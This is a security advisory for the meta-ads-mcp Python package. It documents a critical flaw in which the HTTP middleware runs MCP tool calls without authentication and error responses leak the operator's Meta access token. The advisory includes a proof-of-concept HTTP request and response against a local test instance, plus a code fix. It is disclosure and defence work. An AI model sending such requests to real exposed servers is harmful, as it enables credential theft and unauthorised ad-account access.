# [C] Meta Ads MCP: Unauthenticated HTTP MCP Tool Execution Leaks Operator Meta Access Token

## Summary
Severity: Critical
Advisory: GHSA-9gw6-46qc-99vr
CVE: CVE-2026-48039
CWE: CWE-209, CWE-287, CWE-522
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N (CVSS_V3)
Published: 2026-06-11
Source: https://github.com/advisories/GHSA-9gw6-46qc-99vr
Type: github-advisory

## Affected
- PyPI: `meta-ads-mcp` — affected >=0 <1.0.109

## Details
# Unauthenticated HTTP MCP Tool Execution Leaks Operator Meta Access Token

| Field            | Value |
| ---------------- | ----- |
| Repository       | pipeboard-co/meta-ads-mcp |
| Affected version | ≤ 1.0.101 (commit 496c988 ~ 7d14226); Versions 1.0.102–1.0.105 lack git tags, so patch status is unconfirmed. |
| Vulnerability    | CWE-287 — Improper Authentication |
| Severity         | Critical |
| CVSS 3.1         | 9.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N) |


## Summary

`AuthInjectionMiddleware.dispatch()` at `http_auth_integration.py:272` unconditionally forwards unauthenticated Streamable HTTP requests to downstream MCP tool handlers without issuing a `401` response, allowing any network-reachable caller to invoke MCP tools without authentication. When no per-request credential is present, tool handlers fall back to the `META_ACCESS_TOKEN` environment variable, and when the downstream Meta Graph API call fails, `api.py:263–269` serialises the raw `httpx` request URL—including the operator's `access_token` as a query parameter—into the JSON-RPC response body, delivering the credential to the unauthenticated caller.

## Affected Code

`meta_ads_mcp/core/http_auth_integration.py:272` — middleware unconditionally calls `call_next(request)` even when no auth headers are present

```python
        if not auth_token and not pipeboard_token:
            logger.warning("HTTP Auth Middleware: No authentication tokens found in headers")

        try:
            response = await call_next(request)   # line 272: no 401 returned
            return response
        finally:
            if auth_token:
                FastMCPAuthIntegration.clear_auth_token()
            if pipeboard_token:
                FastMCPAuthIntegration.clear_pipeboard_token()
```

`meta_ads_mcp/core/api.py:136` — operator token appended to URL query parameters, exposed verbatim in Graph API error response `request_url`

```python
    request_params = params or {}
    request_params["access_token"] = access_token
```

Unauthenticated HTTP POST /mcp → `AuthInjectionMiddleware.dispatch():272` (no 401 returned) → tool handler invokes `make_api_request()` using `META_ACCESS_TOKEN` env fallback → `request_params["access_token"]:136` (token in URL) → Graph API error path at `api.py:263–269` returns `request_url` containing `access_token=…` in 200 OK JSON-RPC response.

## Proof of Concept

Step 1 — POST /mcp with no auth headers: HTTP 200 OK with operator `access_token` in `request_url` — proves unauthenticated tool execution and operator credential leakage.

```bash
docker run --rm -p 127.0.0.1:8080:8080 -e META_ACCESS_TOKEN=FAKE_TOKEN_FOR_POC_DEMO_123456789 meta-ads-mcp-vuln001 &
python3 poc.py
```

```http
POST /mcp HTTP/1.1
Host: 127.0.0.1:8080
Content-Type: application/json
Accept: application/json, text/event-stream

{"jsonrpc":"2.0","method":"tools/call","id":2,"params":{"name":"get_ad_accounts","arguments":{"limit":1}}}
```

```http
HTTP/1.1 200 OK
Content-Type: application/json

{
  "jsonrpc": "2.0",
  "id": 2,
  "result": {
    "content": [
      {
        "type": "text",
        "text": "{\"data\": \"{\\n  \\\"error\\\": {\\n    \\\"message\\\": \\\"HTTP Error: 400\\\",\\n    \\\"details\\\": {\\n      \\\"error\\\": {\\n        \\\"message\\\": \\\"Invalid OAuth access token data.\\\",\\n        \\\"type\\\": \\\"OAuthException\\\",\\n        \\\"code\\\": 190\\n      }\\n    },\\n    \\\"full_response\\\": {\\n      \\\"status_code\\\": 400,\\n      \\\"url\\\": \\\"https://graph.facebook.com/v24.0/me/adaccounts?...&access_token=FAKE_TOKEN_FOR_POC_DEMO_123456789\\\",\\n      \\\"request_url\\\": \\\"https://graph.facebook.com/v24.0/me/adaccounts?fields=id%2Cname%2Caccount_id%2Caccount_status%2Camount_spent%2Cbalance%2Ccurrency%2Cage%2Cbusiness_city%2Cbusiness_country_code&limit=1&access_token=FAKE_TOKEN_FOR_POC_DEMO_123456789\\\"\\n    }\\n  }\\n}\"}"
      }
    ],
    "isError": false
  }
}
```

## Impact

An unauthenticated attacker who can reach the MCP server's HTTP port (default 8080) can invoke any registered MCP tool as the operator, consuming the operator's Meta Ads API quota and performing read or write operations on connected Meta ad accounts. When any tool call triggers a Graph API error, the operator's `META_ACCESS_TOKEN` is returned verbatim in the `request_url` field of the 200 OK JSON-RPC response, enabling the attacker to exfiltrate the long-lived credential and subsequently access the Meta Graph API directly outside the MCP interface.

## Remediation

In `AuthInjectionMiddleware.dispatch()` (`http_auth_integration.py`), return a `401 Unauthorized` response when neither `auth_token` nor `pipeboard_token` is present, instead of falling through to `call_next`:

```python
from starlette.responses import Response

if not auth_token and not pipeboard_token:
    return Response(
        content='{"error":"Unauthorized"}',
        status_code=401,
        media_type="application/json",
    )
```

In `make_api_request()` (`api.py`), strip `access_token` from the `request_url` in error payloads, or transmit the token via an `Authorization: Bearer` header rather than a URL query parameter to prevent it from appearing in URLs, server logs, or error responses.

## References
- https://github.com/pipeboard-co/meta-ads-mcp/security/advisories/GHSA-9gw6-46qc-99vr
- https://nvd.nist.gov/vuln/detail/CVE-2026-48039
- https://github.com/pipeboard-co/meta-ads-mcp
- https://github.com/pipeboard-co/meta-ads-mcp/releases/tag/1.0.109
- https://github.com/pypa/advisory-database/tree/main/vulns/meta-ads-mcp/PYSEC-2026-413.yaml
